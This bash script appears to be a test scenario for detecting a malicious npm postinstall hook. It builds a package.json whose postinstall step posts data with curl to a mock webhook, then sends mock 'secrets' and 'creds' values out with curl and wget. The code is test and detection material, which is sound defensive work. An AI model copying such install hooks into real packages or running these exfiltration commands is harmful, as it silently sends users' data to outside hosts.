#!/usr/bin/env bash
set -e

# Scenario 1: Malicious Postinstall Script Execution

WORKDIR="test-malicious-package"
rm -rf "$WORKDIR"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

cat > package.json << 'EOF'
{
  "name": "test-evil-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl -d 'test=data' $MOCK_WEBHOOK || echo 'Mock exfiltration attempt'"
  },
  "dependencies": {}
}
EOF

echo "Installing to trigger postinstall..."
npm config set fund false >/dev/null 2>&1 || true
npm config set audit false >/dev/null 2>&1 || true
npm install || true

echo "Alt variations..."
npm init -y >/dev/null 2>&1 || true
npm install --save test-package || true
curl -d "secrets=fake" "${MOCK_WEBHOOK:-http://localhost:8080/webhook-receiver}" || true

if command -v yarn >/dev/null 2>&1; then
  yarn add test-package || true
fi

if command -v wget >/dev/null 2>&1; then
  wget --post-data="creds=test" "${MOCK_WEBHOOK:-http://localhost:8080/webhook-receiver}" -O /dev/null || true
fi

echo "Scenario 1 complete"

